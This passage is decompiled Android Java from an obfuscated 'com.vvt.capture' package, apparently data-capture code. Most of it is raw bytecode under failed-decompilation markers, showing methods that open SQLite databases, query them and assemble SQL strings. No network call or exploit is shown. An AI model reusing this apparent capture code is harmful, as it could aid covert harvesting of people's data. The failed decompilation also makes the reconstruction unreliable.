    //   39: invokestatic 58	com/vvt/capture/removeFromPath/a/a:e	()Ljava/lang/String;
    //   42: astore_2
    //   43: iconst_2
    //   44: istore 4
    //   46: iload 4
    //   48: anewarray 26	java/lang/String
    //   51: astore 5
    //   53: iconst_0
    //   54: istore 6
    //   56: aconst_null
    //   57: astore 7
    //   59: iconst_0
    //   60: istore 8
    //   62: aconst_null
    //   63: astore 9
    //   65: iconst_0
    //   66: invokestatic 64	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   69: astore 9
    //   71: aload 5
    //   73: iconst_0
    //   74: aload 9
    //   76: aastore
    //   77: iconst_1
    //   78: istore 6
    //   80: iconst_1
    //   81: istore 8
    //   83: iload 8
    //   85: invokestatic 64	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   88: astore 9
    //   90: aload 5
    //   92: iload 6
    //   94: aload 9
    //   96: aastore
    //   97: aload_3
    //   98: aload_2
    //   99: aload 5
    //   101: invokevirtual 70	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   104: astore_2
    //   105: aload_2
    //   106: invokeinterface 139 1 0
    //   111: istore 4
    //   113: iload 4
    //   115: ifeq +659 -> 774
    //   118: ldc 78
    //   120: astore 5
    //   122: aload_2
    //   123: aload 5
    //   125: invokeinterface 82 2 0
    //   130: istore 4
    //   132: aload_2
    //   133: iload 4
    //   135: invokeinterface 85 2 0
    //   140: astore 7
    //   142: ldc 87
    //   144: astore 5
    //   146: aload_2
    //   147: aload 5
    //   149: invokeinterface 82 2 0
    //   154: istore 4
    //   156: aload_2
    //   157: iload 4
    //   159: invokeinterface 91 2 0
    //   164: lstore 10
    //   166: ldc 93
    //   168: astore 5
    //   170: aload_2
    //   171: aload 5
    //   173: invokeinterface 82 2 0
    //   178: istore 4
    //   180: aload_2
    //   181: iload 4
    //   183: invokeinterface 85 2 0
    //   188: astore 12
    //   190: new 95	com/vvt/capture/removeFromPath/d
    //   193: astore 5
    //   195: aload 5
    //   197: invokespecial 99	com/vvt/capture/removeFromPath/d:<init>	()V
    //   200: aload 5
    //   202: aload 7
    //   204: invokevirtual 102	com/vvt/capture/removeFromPath/d:a	(Ljava/lang/String;)V
    //   207: aload 5
    //   209: aload 12
    //   211: invokevirtual 104	com/vvt/capture/removeFromPath/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   214: aload 5
    //   216: lload 10
    //   218: invokevirtual 107	com/vvt/capture/removeFromPath/d:removeFromPath	(J)V
    //   221: ldc 127
    //   223: astore 7
    //   225: aload 5
    //   227: aload 7
    //   229: invokevirtual 109	com/vvt/capture/removeFromPath/d:e	(Ljava/lang/String;)V
    //   232: aload_2
    //   233: ifnull +9 -> 242
    //   236: aload_2
    //   237: invokeinterface 112 1 0
    //   242: aload_3
    //   243: ifnull +7 -> 250
    //   246: aload_3
    //   247: invokevirtual 131	android/database/sqlite/SQLiteDatabase:close	()V
    //   250: aload_3
    //   251: astore 13
    //   253: aload 5
    //   255: astore_3
    //   256: aload 13
    //   258: astore 5
    //   260: ldc -123
    //   262: astore 7
    //   264: aload 7
    //   266: invokestatic 761	com/vvt/capture/removeFromPath/a/a:a	(Ljava/lang/String;)Ljava/lang/String;
    //   269: astore 7
    //   271: aload 7
    //   273: ifnull +488 -> 761
    //   276: ldc -123
    //   278: astore 7
    //   280: ldc_w 440
    //   283: astore 9
    //   285: aload 7
    //   287: aload 9
    //   289: invokestatic 1032	com/vvt/p/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   292: astore 5
    //   294: aload 5
    //   296: ifnull +465 -> 761
    //   299: invokestatic 58	com/vvt/capture/removeFromPath/a/a:e	()Ljava/lang/String;
    //   302: astore 7
    //   304: iconst_2
    //   305: istore 8
    //   307: iload 8
    //   309: anewarray 26	java/lang/String
    //   312: astore 9
    //   314: iconst_0
    //   315: istore 14
    //   317: iconst_0
    //   318: istore 15
    //   320: aconst_null
    //   321: astore 12
    //   323: iconst_0
    //   324: invokestatic 64	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   327: astore 12
    //   329: aload 9
    //   331: iconst_0
    //   332: aload 12
    //   334: aastore
    //   335: iconst_1
    //   336: istore 14
    //   338: iconst_1
    //   339: istore 15
    //   341: iload 15
    //   343: invokestatic 64	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   346: astore 12
    //   348: aload 9
    //   350: iload 14
    //   352: aload 12
    //   354: aastore
    //   355: aload 5
    //   357: aload 7
    //   359: aload 9
    //   361: invokevirtual 70	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   364: astore_2
    //   365: aload_2
    //   366: invokeinterface 139 1 0
    //   371: istore 6
    //   373: iload 6
    //   375: ifeq +386 -> 761
    //   378: ldc 78
    //   380: astore 7
    //   382: aload_2
    //   383: aload 7
    //   385: invokeinterface 82 2 0
    //   390: istore 6
    //   392: aload_2
    //   393: iload 6
    //   395: invokeinterface 85 2 0
    //   400: astore 9
    //   402: ldc 87
    //   404: astore 7
    //   406: aload_2
    //   407: aload 7
    //   409: invokeinterface 82 2 0
    //   414: istore 6
    //   416: aload_2
    //   417: iload 6
    //   419: invokeinterface 91 2 0
    //   424: lstore 16
    //   426: ldc 93
    //   428: astore 7
    //   430: aload_2
    //   431: aload 7
    //   433: invokeinterface 82 2 0
    //   438: istore 6
    //   440: aload_2
    //   441: iload 6
    //   443: invokeinterface 85 2 0
    //   448: astore 18
    //   450: new 95	com/vvt/capture/removeFromPath/d
    //   453: astore 7
    //   455: aload 7
    //   457: invokespecial 99	com/vvt/capture/removeFromPath/d:<init>	()V
    //   460: aload 7
    //   462: aload 9
    //   464: invokevirtual 102	com/vvt/capture/removeFromPath/d:a	(Ljava/lang/String;)V
    //   467: aload 7
    //   469: aload 18
    //   471: invokevirtual 104	com/vvt/capture/removeFromPath/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   474: aload 7
    //   476: lload 16
    //   478: invokevirtual 107	com/vvt/capture/removeFromPath/d:removeFromPath	(J)V
    //   481: ldc -123
    //   483: astore_0
    //   484: aload 7
    //   486: aload_0
    //   487: invokevirtual 109	com/vvt/capture/removeFromPath/d:e	(Ljava/lang/String;)V
    //   490: aload_2
    //   491: astore_0
    //   492: aload 7
    //   494: astore_2
    //   495: aload_0
    //   496: ifnull +9 -> 505
    //   499: aload_0
    //   500: invokeinterface 112 1 0
    //   505: aload 5
    //   507: ifnull +8 -> 515
    //   510: aload 5
    //   512: invokevirtual 131	android/database/sqlite/SQLiteDatabase:close	()V
    //   515: aload_3
    //   516: aload_2
    //   517: invokestatic 136	com/vvt/capture/removeFromPath/a/a:a	(Lcom/vvt/capture/removeFromPath/d;Lcom/vvt/capture/removeFromPath/d;)Lcom/vvt/capture/removeFromPath/d;
    //   520: astore_2
    //   521: aload_2
    //   522: ifnull +33 -> 555
    //   525: getstatic 19	com/vvt/capture/removeFromPath/a/a:removeFromPath	Z
    //   528: istore 19
    //   530: iload 19
    //   532: ifeq +3 -> 535
    //   535: getstatic 19	com/vvt/capture/removeFromPath/a/a:removeFromPath	Z
    //   538: istore 19
    //   540: iload 19
    //   542: ifeq +3 -> 545
    //   545: getstatic 19	com/vvt/capture/removeFromPath/a/a:removeFromPath	Z
    //   548: istore 19
    //   550: iload 19
    //   552: ifeq +3 -> 555
    //   555: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   558: istore 19
    //   560: iload 19
    //   562: ifeq +3 -> 565
    //   565: aload_2
    //   566: areturn
    //   567: astore_2
    //   568: iconst_0
    //   569: istore 4
    //   571: aconst_null
    //   572: astore 5
    //   574: iconst_0
    //   575: istore_1
    //   576: aconst_null
    //   577: astore_2
    //   578: iconst_0
    //   579: istore 19
    //   581: aconst_null
    //   582: astore_3
    //   583: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   586: istore 6
    //   588: iload 6
    //   590: ifeq +3 -> 593
    //   593: aload_0
    //   594: ifnull +9 -> 603
    //   597: aload_0
    //   598: invokeinterface 112 1 0
    //   603: aload 5
    //   605: ifnull -90 -> 515
    //   608: goto -98 -> 510
    //   611: astore_2
    //   612: iconst_0
    //   613: istore 4
    //   615: aconst_null
    //   616: astore 5
    //   618: aload_0
    //   619: ifnull +9 -> 628
    //   622: aload_0
    //   623: invokeinterface 112 1 0
    //   628: aload 5
    //   630: ifnull +8 -> 638
    //   633: aload 5
    //   635: invokevirtual 131	android/database/sqlite/SQLiteDatabase:close	()V
    //   638: aload_2
    //   639: athrow
    //   640: astore_2
    //   641: aload_3
    //   642: astore 5
    //   644: goto -26 -> 618
    //   647: astore_0
    //   648: aload_3
    //   649: astore 5
    //   651: aload_2
    //   652: astore 13
    //   654: aload_0
    //   655: astore_2
    //   656: aload 13
    //   658: astore_0
    //   659: goto -41 -> 618
    //   662: astore_3
    //   663: aload_2
    //   664: astore_0
    //   665: aload_3
    //   666: astore_2
    //   667: goto -49 -> 618
    //   670: astore_2
    //   671: goto -53 -> 618
    //   674: astore_2
    //   675: aload_3
    //   676: astore 5
    //   678: iconst_0
    //   679: istore_1
    //   680: aconst_null
    //   681: astore_2
    //   682: iconst_0
    //   683: istore 19
    //   685: aconst_null
    //   686: astore_3
    //   687: goto -104 -> 583
    //   690: astore 5
    //   692: aload_3
    //   693: astore 5
    //   695: iconst_0
    //   696: istore 19
    //   698: aconst_null
    //   699: astore_3
    //   700: aconst_null
    //   701: astore 13
    //   703: aload_2
    //   704: astore_0
    //   705: iconst_0
    //   706: istore_1
    //   707: aconst_null
    //   708: astore_2
    //   709: goto -126 -> 583
    //   712: astore 7
    //   714: aload_2
    //   715: astore 13
    //   717: iconst_0
    //   718: istore_1
    //   719: aconst_null
    //   720: astore_2
    //   721: aload 13
    //   723: astore_0
    //   724: aload_3
    //   725: astore 20
    //   727: aload 5
    //   729: astore_3
    //   730: aload 20
    //   732: astore 5
    //   734: goto -151 -> 583
    //   737: astore 7
    //   739: aload_2
    //   740: astore 13
    //   742: iconst_0
    //   743: istore_1
    //   744: aconst_null
    //   745: astore_2
    //   746: aload 13
    //   748: astore_0
    //   749: goto -166 -> 583
    //   752: astore_0
    //   753: aload_2
    //   754: astore_0
    //   755: aload 7
    //   757: astore_2
    //   758: goto -175 -> 583
    //   761: aload_2
    //   762: astore 13
    //   764: iconst_0
    //   765: istore_1
    //   766: aconst_null
    //   767: astore_2
    //   768: aload 13
    //   770: astore_0
    //   771: goto -276 -> 495
    //   774: iconst_0
    //   775: istore 4
    //   777: aconst_null
    //   778: astore 5
    //   780: goto -548 -> 232
    //   783: iconst_0
    //   784: istore_1
    //   785: aconst_null
    //   786: astore_2
    //   787: iconst_0
    //   788: istore 4
    //   790: aconst_null
    //   791: astore 5
    //   793: goto -561 -> 232
    //   796: iconst_0
    //   797: istore_1
    //   798: aconst_null
    //   799: astore_2
    //   800: iconst_0
    //   801: istore 4
    //   803: aconst_null
    //   804: astore 5
    //   806: iconst_0
    //   807: istore 19
    //   809: aconst_null
    //   810: astore_3
    //   811: goto -551 -> 260
    // Local variable table:
    //   start	length	slot	name	signature
    //   1	622	0	localObject1	Object
    //   647	8	0	localObject2	Object
    //   658	91	0	localObject3	Object
    //   752	1	0	localException1	Exception
    //   754	17	0	localObject4	Object
    //   5	793	1	bool1	boolean
    //   12	554	2	localObject5	Object
    //   567	1	2	localException2	Exception
    //   577	1	2	localObject6	Object
    //   611	28	2	localObject7	Object
    //   640	12	2	localObject8	Object
    //   655	12	2	localObject9	Object
    //   670	1	2	localObject10	Object
    //   674	1	2	localException3	Exception
    //   681	119	2	localObject11	Object
    //   28	621	3	localObject12	Object
    //   662	14	3	localObject13	Object
    //   686	125	3	localObject14	Object
    //   44	3	4	i	int
    //   111	3	4	bool2	boolean
    //   130	672	4	j	int
    //   51	626	5	localObject15	Object
    //   690	1	5	localException4	Exception
    //   693	112	5	localObject16	Object
    //   54	320	6	bool3	boolean
    //   390	52	6	k	int
    //   586	3	6	bool4	boolean
    //   57	436	7	localObject17	Object
    //   712	1	7	localException5	Exception
    //   737	19	7	localException6	Exception
    //   60	248	8	m	int
    //   63	400	9	localObject18	Object
    //   164	53	10	l1	long
    //   188	165	12	str1	String
    //   251	518	13	localObject19	Object
    //   315	36	14	n	int
    //   318	24	15	i1	int
    //   424	53	16	l2	long
    //   448	22	18	str2	String
    //   528	280	19	bool5	boolean
    //   725	6	20	localObject20	Object
    // Exception table:
    //   from	to	target	type
    //   13	17	567	java/lang/Exception
    //   30	34	567	java/lang/Exception
    //   13	17	611	finally
    //   30	34	611	finally
    //   39	42	640	finally
    //   46	51	640	finally
    //   65	69	640	finally
    //   74	77	640	finally
    //   83	88	640	finally
    //   94	97	640	finally
    //   99	104	640	finally
    //   105	111	647	finally
    //   123	130	647	finally
    //   133	140	647	finally
    //   147	154	647	finally
    //   157	164	647	finally
    //   171	178	647	finally
    //   181	188	647	finally
    //   190	193	647	finally
    //   195	200	647	finally
    //   202	207	647	finally
    //   209	214	647	finally
    //   216	221	647	finally
    //   227	232	647	finally
    //   236	242	647	finally
    //   246	250	647	finally
    //   264	269	662	finally
    //   287	292	662	finally
    //   299	302	662	finally
    //   307	312	662	finally
    //   323	327	662	finally
    //   332	335	662	finally
    //   341	346	662	finally
    //   352	355	662	finally
    //   359	364	662	finally
    //   365	371	662	finally
    //   383	390	662	finally
    //   393	400	662	finally
    //   407	414	662	finally
    //   417	424	662	finally
    //   431	438	662	finally
    //   441	448	662	finally
    //   450	453	662	finally
    //   455	460	662	finally
    //   462	467	662	finally
    //   469	474	662	finally
    //   476	481	662	finally
    //   486	490	662	finally
    //   583	586	670	finally
    //   39	42	674	java/lang/Exception
    //   46	51	674	java/lang/Exception
    //   65	69	674	java/lang/Exception
    //   74	77	674	java/lang/Exception
    //   83	88	674	java/lang/Exception
    //   94	97	674	java/lang/Exception
    //   99	104	674	java/lang/Exception
    //   105	111	690	java/lang/Exception
    //   123	130	690	java/lang/Exception
    //   133	140	690	java/lang/Exception
    //   147	154	690	java/lang/Exception
    //   157	164	690	java/lang/Exception
    //   171	178	690	java/lang/Exception
    //   181	188	690	java/lang/Exception
    //   190	193	690	java/lang/Exception
    //   195	200	690	java/lang/Exception
    //   202	207	712	java/lang/Exception
    //   209	214	712	java/lang/Exception
    //   216	221	712	java/lang/Exception
    //   227	232	712	java/lang/Exception
    //   236	242	712	java/lang/Exception
    //   246	250	712	java/lang/Exception
    //   264	269	737	java/lang/Exception
    //   287	292	737	java/lang/Exception
    //   299	302	737	java/lang/Exception
    //   307	312	737	java/lang/Exception
    //   323	327	737	java/lang/Exception
    //   332	335	737	java/lang/Exception
    //   341	346	737	java/lang/Exception
    //   352	355	737	java/lang/Exception
    //   359	364	737	java/lang/Exception
    //   365	371	737	java/lang/Exception
    //   383	390	737	java/lang/Exception
    //   393	400	737	java/lang/Exception
    //   407	414	737	java/lang/Exception
    //   417	424	737	java/lang/Exception
    //   431	438	737	java/lang/Exception
    //   441	448	737	java/lang/Exception
    //   450	453	737	java/lang/Exception
    //   455	460	737	java/lang/Exception
    //   462	467	752	java/lang/Exception
    //   469	474	752	java/lang/Exception
    //   476	481	752	java/lang/Exception
    //   486	490	752	java/lang/Exception
  }
  
  private static String b(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    int i = 0;
    Object localObject = null;
    boolean bool = a;
    if ((!bool) || (paramSQLiteDatabase != null))
    {
      bool = com.vvt.ag.b.a(paramString);
      if (!bool)
      {
        String str = "null";
        bool = paramString.equalsIgnoreCase(str);
        if (!bool)
        {
          i = 1;
          localObject = new String[i];
          str = null;
          localObject[0] = paramString;
          localObject = a(paramSQLiteDatabase, (String[])localObject);
          bool = a;
          if (!bool) {}
        }
      }
    }
    return (String)localObject;
  }
  
  /* Error */
  private static String b(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: aload_0
    //   3: ifnull +136 -> 139
    //   6: aload_2
    //   7: invokestatic 1230	com/vvt/capture/removeFromPath/a/a:removeFromPath	(Ljava/lang/String;)Ljava/lang/String;
    //   10: astore 4
    //   12: iconst_1
    //   13: istore 5
    //   15: iload 5
    //   17: anewarray 26	java/lang/String
    //   20: astore 6
    //   22: aload 6
    //   24: iconst_0
    //   25: aload_1
    //   26: aastore
    //   27: aload_0
    //   28: aload 4
    //   30: aload 6
    //   32: invokevirtual 70	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   35: astore 4
    //   37: aload 4
    //   39: invokeinterface 139 1 0
    //   44: istore 5
    //   46: iload 5
    //   48: ifeq +23 -> 71
    //   51: aload 4
    //   53: aload_2
    //   54: invokeinterface 82 2 0
    //   59: istore 5
    //   61: aload 4
    //   63: iload 5
    //   65: invokeinterface 85 2 0
    //   70: astore_3
    //   71: aload 4
    //   73: ifnull +10 -> 83
    //   76: aload 4
    //   78: invokeinterface 112 1 0
    //   83: aload_3
    //   84: areturn
    //   85: astore 4
    //   87: aconst_null
    //   88: astore 4
    //   90: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   93: istore 5
    //   95: iload 5
    //   97: ifeq +3 -> 100
    //   100: aload 4
    //   102: ifnull -19 -> 83
    //   105: goto -29 -> 76
    //   108: astore 7
    //   110: aconst_null
    //   111: astore 4
    //   113: aload 7
    //   115: astore_3
    //   116: aload 4
    //   118: ifnull +10 -> 128
    //   121: aload 4
    //   123: invokeinterface 112 1 0
    //   128: aload_3
    //   129: athrow
    //   130: astore_3
    //   131: goto -15 -> 116
    //   134: astore 6
    //   136: goto -46 -> 90
    //   139: aconst_null
    //   140: astore 4
    //   142: goto -71 -> 71
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	145	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	145	1	paramString1	String
    //   0	145	2	paramString2	String
    //   1	128	3	localObject1	Object
    //   130	1	3	localObject2	Object
    //   10	67	4	localObject3	Object
    //   85	1	4	localException1	Exception
    //   88	53	4	localObject4	Object
    //   13	34	5	bool1	boolean
    //   59	5	5	i	int
    //   93	3	5	bool2	boolean
    //   20	11	6	arrayOfString	String[]
    //   134	1	6	localException2	Exception
    //   108	6	7	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   6	10	85	java/lang/Exception
    //   15	20	85	java/lang/Exception
    //   25	27	85	java/lang/Exception
    //   30	35	85	java/lang/Exception
    //   6	10	108	finally
    //   15	20	108	finally
    //   25	27	108	finally
    //   30	35	108	finally
    //   37	44	130	finally
    //   53	59	130	finally
    //   63	70	130	finally
    //   90	93	130	finally
    //   37	44	134	java/lang/Exception
    //   53	59	134	java/lang/Exception
    //   63	70	134	java/lang/Exception
  }
  
  /* Error */
  private static String b(SQLiteDatabase paramSQLiteDatabase, boolean paramBoolean)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: ldc_w 338
    //   5: astore_3
    //   6: iconst_0
    //   7: istore 4
    //   9: new 168	java/lang/StringBuilder
    //   12: astore 5
    //   14: aload 5
    //   16: invokespecial 169	java/lang/StringBuilder:<init>	()V
    //   19: aload 5
    //   21: ldc_w 340
    //   24: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   27: pop
    //   28: aload 5
    //   30: ldc_w 342
    //   33: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   36: pop
    //   37: aload 5
    //   39: ldc_w 344
    //   42: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   45: pop
    //   46: aload 5
    //   48: ldc_w 346
    //   51: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   54: pop
    //   55: aload 5
    //   57: ldc_w 348
    //   60: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   63: pop
    //   64: aload 5
    //   66: ldc_w 350
    //   69: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   72: pop
    //   73: ldc_w 352
    //   76: astore 6
    //   78: aload 5
    //   80: aload 6
    //   82: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   85: pop
    //   86: iload_1
    //   87: ifeq +16 -> 103
    //   90: ldc_w 354
    //   93: astore 6
    //   95: aload 5
    //   97: aload 6
    //   99: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   102: pop
    //   103: aload 5
    //   105: ldc_w 356
    //   108: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   111: pop
    //   112: aload 5
    //   114: ldc_w 358
    //   117: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   120: pop
    //   121: aload 5
    //   123: ldc_w 360
    //   126: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   129: pop
    //   130: aload 5
    //   132: ldc_w 362
    //   135: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   138: pop
    //   139: aload 5
    //   141: ldc_w 364
    //   144: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   147: pop
    //   148: aload 5
    //   150: ldc_w 366
    //   153: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   156: pop
    //   157: ldc_w 368
    //   160: astore 7
    //   162: iconst_0
    //   163: istore 8
    //   165: aconst_null
    //   166: astore 9
    //   168: ldc_w 370
    //   171: astore 10
    //   173: aload_0
    //   174: astore 6
    //   176: aload_0
    //   177: aload 7
    //   179: aconst_null
    //   180: aconst_null
    //   181: aconst_null
    //   182: aconst_null
    //   183: aconst_null
    //   184: aconst_null
    //   185: aload 10
    //   187: invokevirtual 373	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   190: astore_2
    //   191: aload_2
    //   192: ifnull +490 -> 682
    //   195: ldc_w 375
    //   198: astore 6
    //   200: aload_2
    //   201: aload 6
    //   203: invokeinterface 82 2 0
    //   208: istore 11
    //   210: iload 11
    //   212: iflt +16 -> 228
    //   215: ldc_w 377
    //   218: astore 6
    //   220: aload 5
    //   222: aload 6
    //   224: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   227: pop
    //   228: ldc_w 379
    //   231: astore 6
    //   233: aload_2
    //   234: aload 6
    //   236: invokeinterface 82 2 0
    //   241: istore 11
    //   243: iload 11
    //   245: iflt +278 -> 523
    //   248: ldc_w 381
    //   251: astore 6
    //   253: aload 5
    //   255: aload 6
    //   257: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   260: pop
    //   261: ldc_w 379
    //   264: astore_3
    //   265: aload_2
    //   266: ifnull +9 -> 275
    //   269: aload_2
    //   270: invokeinterface 112 1 0
    //   275: ldc_w 383
    //   278: astore 7
    //   280: iconst_0
    //   281: istore 8
    //   283: aconst_null
    //   284: astore 9
    //   286: ldc_w 370
    //   289: astore 10
    //   291: aload_0
    //   292: astore 6
    //   294: aload_0
    //   295: aload 7
    //   297: aconst_null
    //   298: aconst_null
    //   299: aconst_null
    //   300: aconst_null
    //   301: aconst_null
    //   302: aconst_null
    //   303: aload 10
    //   305: invokevirtual 373	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   308: astore 6
    //   310: ldc_w 385
    //   313: astore 7
    //   315: aload 6
    //   317: aload 7
    //   319: invokeinterface 82 2 0
    //   324: istore 12
    //   326: iload 12
    //   328: iflt +339 -> 667
    //   331: ldc_w 387
    //   334: astore 7
    //   336: aload 5
    //   338: aload 7
    //   340: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   343: pop
    //   344: iconst_1
    //   345: istore 4
    //   347: aload 6
    //   349: astore_2
    //   350: aload_3
    //   351: astore 7
    //   353: iload 4
    //   355: istore 11
    //   357: aload_2
    //   358: ifnull +9 -> 367
    //   361: aload_2
    //   362: invokeinterface 112 1 0
    //   367: aload 5
    //   369: ldc_w 389
    //   372: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   375: pop
    //   376: aload 5
    //   378: ldc_w 391
    //   381: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   384: pop
    //   385: aload 5
    //   387: ldc_w 393
    //   390: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   393: aload 7
    //   395: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   398: pop
    //   399: ldc_w 395
    //   402: astore 9
    //   404: aload 5
    //   406: aload 9
    //   408: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   411: pop
    //   412: iload_1
    //   413: ifeq +16 -> 429
    //   416: ldc_w 397
    //   419: astore 9
    //   421: aload 5
    //   423: aload 9
    //   425: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   428: pop
    //   429: iload 11
    //   431: ifeq +16 -> 447
    //   434: ldc_w 399
    //   437: astore 6
    //   439: aload 5
    //   441: aload 6
    //   443: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   446: pop
    //   447: aload 5
    //   449: ldc_w 401
    //   452: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   455: pop
    //   456: aload 5
    //   458: ldc_w 403
    //   461: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   464: pop
    //   465: aload 5
    //   467: ldc_w 405
    //   470: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   473: aload 7
    //   475: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   478: ldc_w 407
    //   481: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   484: aload 7
    //   486: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   489: pop
    //   490: aload 5
    //   492: ldc_w 1232
    //   495: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   498: pop
    //   499: aload 5
    //   501: ldc_w 417
    //   504: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   507: pop
    //   508: aload 5
    //   510: ldc_w 419
    //   513: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   516: pop
    //   517: aload 5
    //   519: invokevirtual 181	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   522: areturn
    //   523: ldc_w 421
    //   526: astore 6
    //   528: aload_2
    //   529: aload 6
    //   531: invokeinterface 82 2 0
    //   536: istore 11
    //   538: iload 11
    //   540: iflt -275 -> 265
    //   543: ldc_w 423
    //   546: astore 6
    //   548: aload 5
    //   550: aload 6
    //   552: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   555: pop
    //   556: ldc_w 421
    //   559: astore_3
    //   560: goto -295 -> 265
    //   563: astore 6
    //   565: iconst_0
    //   566: istore 12
    //   568: aconst_null
    //   569: astore 7
    //   571: aload_3
    //   572: astore 6
    //   574: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   577: istore 8
    //   579: iload 8
    //   581: ifeq +3 -> 584
    //   584: aload 7
    //   586: ifnull +10 -> 596
    //   589: aload 7
    //   591: invokeinterface 112 1 0
    //   596: aload 6
    //   598: astore 7
    //   600: iconst_0
    //   601: istore 11
    //   603: aconst_null
    //   604: astore 6
    //   606: goto -239 -> 367
    //   609: astore 6
    //   611: aload_2
    //   612: ifnull +9 -> 621
    //   615: aload_2
    //   616: invokeinterface 112 1 0
    //   621: aload 6
    //   623: athrow
    //   624: astore 7
    //   626: aload 6
    //   628: astore_2
    //   629: aload 7
    //   631: astore 6
    //   633: goto -22 -> 611
    //   636: astore 6
    //   638: aload 7
    //   640: astore_2
    //   641: goto -30 -> 611
    //   644: astore 6
    //   646: aload_2
    //   647: astore 7
    //   649: aload_3
    //   650: astore 6
    //   652: goto -78 -> 574
    //   655: astore 7
    //   657: aload 6
    //   659: astore 7
    //   661: aload_3
    //   662: astore 6
    //   664: goto -90 -> 574
    //   667: aload 6
    //   669: astore_2
    //   670: aload_3
    //   671: astore 7
    //   673: iconst_0
    //   674: istore 11
    //   676: aconst_null
